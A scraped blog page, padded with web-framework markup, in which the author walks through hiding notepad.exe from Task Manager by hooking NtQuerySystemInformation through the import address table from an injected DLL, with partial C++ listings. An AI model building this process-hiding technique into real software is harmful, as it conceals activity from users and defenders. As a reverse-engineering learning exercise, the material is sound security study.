</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">11</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">case</span><span> DLL_THREAD_ATTACH</span><span class="token" style="color:hsl(76, 21%, 52%)">:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">12</span><span>    </span><span class="token function">WriteLog</span><span class="token" style="-opacity:.7">(</span><span>L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;Thread Attached!&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">13</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">break</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">14</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">case</span><span> DLL_THREAD_DETACH</span><span class="token" style="color:hsl(76, 21%, 52%)">:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">15</span><span>    </span><span class="token function">WriteLog</span><span class="token" style="-opacity:.7">(</span><span>L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;Thread Detached!&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">16</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">break</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">17</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">case</span><span> DLL_PROCESS_DETACH</span><span class="token" style="color:hsl(76, 21%, 52%)">:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">18</span><span>    </span><span class="token function">WriteLog</span><span class="token" style="-opacity:.7">(</span><span>L</span><span class="token" style="color:hsl(76, 21%, 52%)">&quot;Process Detached!&quot;</span><span class="token" style="-opacity:.7">)</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">19</span><span>    </span><span class="token" style="color:hsl(53, 89%, 79%)">break</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">20</span><span>  </span><span class="token" style="-opacity:.7">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">21</span><span>  </span><span class="token" style="color:hsl(53, 89%, 79%)">return</span><span> TRUE</span><span class="token" style="-opacity:.7">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:hsl(0, 0%, 47%)">22</span><span></span><span class="token" style="-opacity:.7">}</span></code></pre><div class="text-center text-md text-gray-500 mt-2 mb-2">Listing 5. DLL Main</div><p>For DLLs, instead of <code class="code-snippet">int main()</code>, <code class="code-snippet">DllMain</code> is used. When DLL is attached in a process, it runs the <code class="code-snippet">Patch</code> function. You can try to build a function that will unpatch the IAT when DLL is detached in the process. If you want to learn more about building a DLL, you can start <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain">here</a>. That&#x27;s it! I have built a program that will hide a process in the task manager! You change it so that the name is based on user-input. As of now, this has already sufficed me.  My Questions... From what I know, to call a function in Assembly Language, you must push all arguments first, then use CALL instruction. Why is the assembly code below does not do that? How does NtQuerySystemInformation know where are the arguments?  Also, on Listing 4, last 4 statements, why does this work? is kernel32.dll address the same for all processes?</p></div></div></main><footer class="py-4 text-center">Copyright © 2024 spacebin. All rights reserved.</footer></div><script src="/_next/static/chunks/webpack-5a3a6c3e710ac7fe.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[7469,[\"968\",\"static/chunks/968-86d16f6179c32d37.js\",\"193\",\"static/chunks/app/posts/hiding-in-task-mgr/page-644b9af44d50b4ce.js\"],\"default\"]\n3:I[6221,[],\"\"]\n4:I[5657,[],\"\"]\n5:I[3996,[],\"ClientSegmentRoot\"]\n6:I[7318,[\"508\",\"static/chunks/508-d5c020c7dab9579d.js\",\"125\",\"static/chunks/app/posts/layout-8c5640ecdae9f2fd.js\"],\"default\"]\na:I[8002,[],\"OutletBoundary\"]\nc:I[8002,[],\"MetadataBoundary\"]\ne:I[8002,[],\"ViewportBoundary\"]\n10:I[4404,[],\"\"]\n:HL[\"/_next/static/css/b7f3fc1ab3fdfa35.css\",\"style\"]\n8:T58e,Of course, I am not familiar with most of the DLL listed above. I'm only familiar with user32 and kernel32 DLLs. I was pretty sure it's not in User32 because that DLL only handles Windows-GUI related functions. One by one, I expanded the DLLs to check what functions does it export. On ntdll.dll, two functions caught my sight; NtQueryInformationProcess and NtQuerySystemInformation. NtQueryInformationProcess retrieves information for only a single process while NtQuerySystemInformation retrieves different kind of data (this includes all running processes on the system) based on its first parameter SYSTEM_INFORMATION_CLASS. To retrieve the list of running processes, you need to pass SystemProcessInformation (which is just equal to 5) as the first parameter. To confirm if Task Manager is using this function to get the processes, I checked the cross references to the function. Below is the second cross reference given by Ghidra.  Yes! It does use NtQuerySystemInformation and pass 5 as its first parameter! For now, I am still unsure which part of the program use the code snippet from above because I am still new to reverse engineering. What now???!  Playing with Windows API For this blog post, my goal was to hide notepad.exe from Task Manager. You can know more about NtQuerySystemInformation by clicking here [https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation]9:T5c6,Hooking it! I now have a function (or a concept) that removes my chosen process from the l"])</script><script>self.__next_f.push([1,"ist of process given by NTQSI. I just need to know how to force Task Manager to call a rogue function instead of the real one, but I am getting ahead of myself. Task Manager is a remote process. I don\\'t even know how to do it on the current process! I should do that first.  I just know the term Windows API hooking but NO idea how to do it, just guesses. After a quick google search, I learned about import address table (IAT) hooking.  This stackoverflow post [https://stackoverflow.com/questions/7673754/pe-format-iat-questions] help me to understand how to get virtual addresses of Windows APIs. Basically, all Windows API functions that are imported are stored in a table allocated in a virtual address. If a process needs to call a Windows API, it can just perform a lookup on that table and get the appropriate address. If you can overwrite that address with the address of a rogue function, then function call is redirected to the rogue function instead of the legitimate one.  Currently, using listing 2 as my rogue function will not work just yet. It still needs modification because line 1 will just call itself resulting to recursion. Remember, I will change the address in the IAT, therefore, before hooking, I should store the address of the legitimate function first. To call the legitimate function, that address will be used. Below is the code that will do that concept."])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"elZCWRZAvGn0IKFFrGZMM\",\"p\":\"\",\"c\":[\"\",\"posts\",\"hiding-in-task-mgr\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"posts\",{\"children\":[\"hiding-in-task-mgr\",{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/b7f3fc1ab3fdfa35.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark\",\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"font-body bg-white dark:bg-black text-black dark:text-zinc-300\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col h-screen\",\"children\":[[\"$\",\"$L2\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex-grow\",\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"py-4 text-center\",\"children\":\"Copyright © 2024 spacebin. All rights reserved.\"}]]}]}]}]]}],{\"children\":[\"posts\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L5\",null,{\"Component\":\"$6\",\"slots\":{\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]},\"params\":{},\"promise\":\"$@7\"}]]}],{\"children\":[\"hiding-in-task-mgr\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",\"hiding-in-task-mgr\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"mx-auto px-12 gap-10 place-content-center w-6xl\",\"children\":[\"$\",\"div\",null,{\"className\":\"mt-6 text-xl leading-10\",\"children\":[[\"$\",\"h1\",null,{\"className\":\"text-4xl mb-1\",\"children\":\"WinAPI Hooking: Hiding Process in Task Manager\"}],[\"$\",\"h3\",null,{\"className\":\"text-gray-400 mb-4\",\"children\":\"Fri, June 19, 2020\"}],[\"$\",\"p\",null,{\"children\":\"I was using Google Chrome for web development purposes and it suddenly stop responding. As usual, I opened my task manager to close that process. While I was searching for chrome.exe, these questions popped into my mind: How does a malware hide itself from the Task Manager? Is this how game hacks evade from anti-cheat software? \\\"I asked these questions probably because I just started reading Practical Malware Analysis! My mind was still in the context of Malware. My guess was that a Window API function is responsible for listing all processes in a system. That way, the function can be used in different applications such as the Task Manager. I open Task Manager on Ghidra to see its imports table. \"}],[\"$\",\"div\",null,{\"className\":\"flex justify-center\",\"children\":[\"$\",\"img\",null,{\"src\":\"/_next/static/media/1imports.4c27a8e1.png\",\"alt\":\"Imports table shown in Ghidra\"}]}],[\"$\",\"br\",null,{}],[\"$\",\"p\",null,{\"children\":\"$8\"}],[\"$\",\"br\",null,{}],[\"$\",\"p\",null,{\"children\":\"The important thing is that the second argument is a pointer to a buffer, which will be overwritten by the function with linked-list-like system information. The type of system information will be determined by the first argument. In this case, the system information is going to be the process information. Below is a sample of that data (SystemBasicInformation).  I described it as a linked-list-like data because the NextEntryOffset property is the address relative to the next process information object. I created a loop that will use the NextEntryOffset to iterate to all process information until the NextEntryOffset is equal to zero. The ImageName property is a buffer to the name of the process. Below is a code that will print all process names.\"}],[[\"$\",\"pre\",null,{\"style\":{\"color\":\"white\",\"background\":\"hsl(0, 0%, 8%)\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"borderRadius\":\".5em\",\"border\":\".3em solid hsl(0, 0%, 33%)\",\"boxShadow\":\"1px 1px .5em black inset\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"padding\":\"1em\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-cpp\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"white\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"while\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"ImageName\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token type-opencl-host-cpp\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"Buffer\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"!=\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token function\",\"style\":{},\"children\":[\"printf\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"%ws\\\\n\\\"\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" systemInformation\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"ImageName\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token type-opencl-host-cpp\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"Buffer\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      systemInformation \"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PSYSTEM_PROCESS_INFORMATION\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"NextEntryOffset \"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                        \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"LPBYTE\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"systemInformation\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}]]]}]}],[\"$\",\"div\",null,{\"className\":\"text-center text-md text-gray-500 mt-2 mb-2\",\"children\":\"Listing 1. Iterating to all process information\"}]],[\"$\",\"p\",null,{\"children\":\"Some little modification, instead of printing the process name for each iteration, you can just use if-statement to compare whether the process name is notepad.exe. If it is, remove the object from the linked list. Else, do nothing. You can check  linked-lists here [https://www.bitdegree.org/learn/linked-list-c-plus-plus].  That means, I need to get the next process name too. If the next process name is equal to notepad.exe, I will overwrite the current process object\\\\'s NextEntryOffset with the NEXT process object\\\\'s NextEntryOffset plus the CURRENT  process object\\\\'s NextEntryOffset. Confusing, ain\\\\'t it?\"}],[[\"$\",\"pre\",null,{\"style\":{\"color\":\"white\",\"background\":\"hsl(0, 0%, 8%)\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"borderRadius\":\".5em\",\"border\":\".3em solid hsl(0, 0%, 33%)\",\"boxShadow\":\"1px 1px .5em black inset\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"padding\":\"1em\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-cpp\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"white\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  status \"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token function\",\"style\":{},\"children\":[\"NtQuerySystemInformation\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"SystemProcessInformation\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" systemInformation\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber 